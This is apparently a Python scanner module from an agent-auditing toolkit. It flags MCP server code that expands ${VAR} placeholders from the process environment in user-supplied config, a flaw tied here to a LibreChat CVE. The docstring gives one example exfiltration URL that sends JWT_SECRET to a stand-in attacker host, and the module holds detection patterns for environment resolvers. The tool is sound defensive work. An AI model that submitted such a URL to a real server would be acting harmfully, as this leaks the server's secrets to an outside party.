"""MCP env-placeholder secret-exfiltration scanner — CVE-2026-32625 class.

Flags an MCP server that resolves ``${VAR}`` / ``$VAR`` placeholders against
its own process environment while handling a user-supplied server config
(typically the URL). An authenticated user can then submit
``https://attacker.example/?k=${JWT_SECRET}`` and the server interpolates its
own secrets into the outbound request.

CVE-2026-32625: LibreChat <= 0.8.3 resolved ``${VAR}`` against ``process.env``
during Zod validation of user-supplied MCP server URLs, leaking ``CREDS_KEY``,
``JWT_SECRET``, ``MONGO_URI`` (CWE-200, CVSS 9.6).

Detection signatures (gated to MCP-context files, low false-positive):
  - TS/JS: a ``.replace(/...${...}.../, ... )`` or ``.replaceAll(...)`` whose
    replacer reads ``process.env``, directly or under a local name
    (``const env = process.env``, ``const { env } = process``).
  - Python: ``os.path.expandvars(<value>)`` (expands ``$VAR``/``${VAR}``
    against ``os.environ``), ``.format(**os.environ)`` /
    ``.format_map(os.environ)``, ``string.Template``'s ``substitute`` and
    ``safe_substitute`` given the environment, and each of these under an
    imported name (``from os.path import expandvars``, ``import os.path as
    osp``, ``from os import environ``).
"""

from __future__ import annotations

import functools
import re
from pathlib import Path

from agent_audit_kit.models import Finding
from agent_audit_kit.scanners._helpers import find_line_number, make_finding, in_skip_dir, sub_up_to_last

_RULE_ID = "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001"

# File must look like it handles MCP server config / URLs.
_MCP_CTX_RE = re.compile(
    r"\bmcp\b|modelcontextprotocol|McpServer|StdioServerParameters|"
    r"mcpServers|server[_-]?url|serverUrl",
    re.IGNORECASE,
)

# TS/JS comment stripping (a comment mentioning process.env must not match).
_TS_BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/", re.DOTALL)
_TS_LINE_COMMENT_RE = re.compile(r"//[^\n]*")

# TS: a `.replace(` whose first arg is a regex/string carrying a ${...}
# placeholder, followed (same call) by a replacer that reads process.env.
# Tolerant of escaping (\$\{ in a regex literal) and whitespace/newlines.
#
# The read for the placeholder stops at the next `.replace(` as well as at `;`.
# With a bare `[^;]*?`, every `.replace(` in a file of them with no `;` read to
# the end of the file: 40,000 characters took 0.63 seconds and the time grew with
# the square. A later `.replace(` reaches the same placeholder itself, so a file matches exactly when it did.
#
# `.replaceAll(` counts as `.replace(` does, and the replacer may read the environment
# under a local name: `const env = process.env;`, `const { env } = process;`,
# `import { env } from "node:process"`. The pattern is built once per set of names.
_TS_REPLACE = r"\.replace(?:All)?\s*\("


@functools.lru_cache(maxsize=64)
def _ts_resolver_re(env_names: tuple[str, ...]) -> re.Pattern[str]:
    env = "process\\.env" + "".join(rf"|(?<![\w$.]){re.escape(name)}\s*[\[.]" for name in env_names)
    return re.compile(
        _TS_REPLACE                                        # .replace( or .replaceAll(
        + r"(?:(?!" + _TS_REPLACE + r")[^;])*?\\?\$\\?\{"  # first arg carries a ${ placeholder
        + r"[^;]{0,200}?"                                  # ...up to the replacer (escaping-tolerant)
        + "(?:" + env + ")",                               # ...which reads the environment
        re.DOTALL,
    )


_TS_ENV_PLACEHOLDER_RE = _ts_resolver_re(())
# `const env = process.env` (not `process.env.X`), `const { env, argv } = process`,
# `const { env: e } = process` and `import { env as e } from "process"`.
_TS_ENV_ALIAS_RE = re.compile(r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*process\s*\.\s*env\b(?!\s*[.\[])")
_TS_ENV_DESTRUCTURE_RE = re.compile(r"\b(?:const|let|var)\s*\{([^{}]{0,200})\}\s*=\s*process\b(?!\s*[.\[])")
_TS_ENV_IMPORT_RE = re.compile(r"\bimport\s*\{([^{}]{0,200})\}\s*from\s*[\"'](?:node:)?process[\"']")
_TS_ENV_BINDING_RE = re.compile(r"(?:^|,)\s*env\s*(?:(?::|\bas\b)\s*([A-Za-z_$][\w$]*))?\s*(?=,|$)")

# Python: expandvars expands $VAR/${VAR} against os.environ.
_PY_EXPANDVARS_RE = re.compile(r"\bos\.path\.expandvars\s*\(")
# Python: format/format_map spreading the whole environment into a template.
_PY_FORMAT_ENV_RE = re.compile(
    r"\.format(?:_map)?\s*\(\s*(?:\*\*\s*os\.environ\b|os\.environ\s*\))"
)
# The same resolvers under the names a module imports them by: `from os.path import
# expandvars [as ev]`, `import os.path as osp`, `from os import path`, `posixpath` and
# `ntpath`, and `from os import environ [as env]`; plus `string.Template`'s
# `substitute` and `safe_substitute` given the environment.
_PY_FROM_IMPORT_RE = re.compile(r"^[ \t]*from[ \t]+(os\.path|posixpath|ntpath|os)[ \t]+import[ \t]+\(?([^\n#)]{1,400})", re.M)
_PY_IMPORT_AS_RE = re.compile(r"^[ \t]*import[ \t]+(?:os\.path|posixpath|ntpath)[ \t]+as[ \t]+([A-Za-z_]\w*)", re.M)
_PY_IMPORT_NAME_RE = re.compile(r"([A-Za-z_]\w*)(?:[ \t]+as[ \t]+([A-Za-z_]\w*))?")


def _py_import_aliases(text: str) -> tuple[set[str], set[str]]:
    """Callables that are `expandvars`, and names bound to `os.environ`, in ``text``."""
    expanders = {"posixpath.expandvars", "ntpath.expandvars"}
    environs: set[str] = set()
    for match in _PY_IMPORT_AS_RE.finditer(text):
        expanders.add(f"{match.group(1)}.expandvars")
    for match in _PY_FROM_IMPORT_RE.finditer(text):
        module = match.group(1)
        for item in match.group(2).split(","):
            name = _PY_IMPORT_NAME_RE.match(item.strip())
            if name is None:
                continue
            bound = name.group(2) or name.group(1)
            if module != "os" and name.group(1) == "expandvars":
                expanders.add(bound)
            elif module == "os" and name.group(1) == "path":
                expanders.add(f"{bound}.expandvars")
            elif module == "os" and name.group(1) == "environ":
                environs.add(bound)
    return expanders, environs


def _strip_ts_comments(text: str) -> str:
    text = sub_up_to_last(_TS_BLOCK_COMMENT_RE, " ", text, "*/")
    text = _TS_LINE_COMMENT_RE.sub(" ", text)
    return text


def _ts_env_names(text: str) -> tuple[str, ...]:
    """The local names a TS/JS file binds to `process.env`."""
    names = {m.group(1) for m in _TS_ENV_ALIAS_RE.finditer(text)}
    for match in list(_TS_ENV_DESTRUCTURE_RE.finditer(text)) + list(_TS_ENV_IMPORT_RE.finditer(text)):
        for binding in _TS_ENV_BINDING_RE.finditer(match.group(1)):
            names.add(binding.group(1) or "env")
    return tuple(sorted(names))


def _ts_hit(text: str) -> bool:
    stripped = _strip_ts_comments(text)
    return bool(_ts_resolver_re(_ts_env_names(stripped)).search(stripped))


def _py_resolver(text: str) -> re.Match[str] | None:
    """The first call in ``text`` that resolves placeholders against the environment."""
    found = _PY_EXPANDVARS_RE.search(text) or _PY_FORMAT_ENV_RE.search(text)
    if found is not None:
        return found
    expanders, environs = _py_import_aliases(text)
    env = r"os\.environ\b" + "".join(rf"|(?<![\w.]){re.escape(name)}\b" for name in sorted(environs))
    callables = "|".join(re.escape(name) for name in sorted(expanders))
    resolver = re.compile(
        rf"(?<![\w.])(?:{callables})\s*\("
        rf"|\.(?:format|substitute|safe_substitute)\s*\(\s*\*\*\s*(?:{env})"
        rf"|\.(?:format_map|substitute|safe_substitute)\s*\(\s*(?:{env})\s*\)"
    )
    return resolver.search(text)


def _py_hit(text: str) -> bool:
    return _py_resolver(text) is not None


_PY_SUFFIXES = (".py",)
_TS_SUFFIXES = (".ts", ".tsx", ".js", ".mjs", ".cjs")


def scan(project_root: Path) -> tuple[list[Finding], set[str]]:
    """Scan for MCP env-placeholder secret exfiltration (CVE-2026-32625 class).

    Args:
        project_root: The root directory of the project to scan.

    Returns:
        A tuple of (list of findings, set of scanned file relative paths).
    """
    findings: list[Finding] = []
    scanned_files: set[str] = set()

    for path in project_root.rglob("*"):
        if path.suffix not in _PY_SUFFIXES + _TS_SUFFIXES:
            continue
        if in_skip_dir(path, project_root):
            continue
        if not path.is_file():
            continue
        try:
            if path.stat().st_size > 1_000_000:
                continue
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue

        if not _MCP_CTX_RE.search(text):
            continue

        line_number: int | None = None
        if path.suffix in _PY_SUFFIXES:
            resolver = _py_resolver(text)
            hit = resolver is not None
            marker = "os.path.expandvars" if "expandvars" in text else "os.environ"
            if resolver is not None and marker not in text:
                # Only an imported name resolves here: report the line of the call.
                line_number = text.count("\n", 0, resolver.start()) + 1
        else:
            hit = _ts_hit(text)
            marker = "process.env"
        if not hit:
            continue

        rel_path = str(path.relative_to(project_root))
        scanned_files.add(rel_path)
        findings.append(make_finding(
            _RULE_ID,
            rel_path,
            (
                f"MCP server resolves ${{VAR}} placeholders against the "
                f"process environment ({marker}) while handling a "
                f"user-supplied server config — a user-supplied URL with "
                f"${{SECRET}} exfiltrates the server's own secrets "
                f"(CVE-2026-32625, CWE-200). Do not expand env placeholders "
                f"found inside untrusted config values."
            ),
            line_number or find_line_number(text, marker),
        ))

    return findings, scanned_files
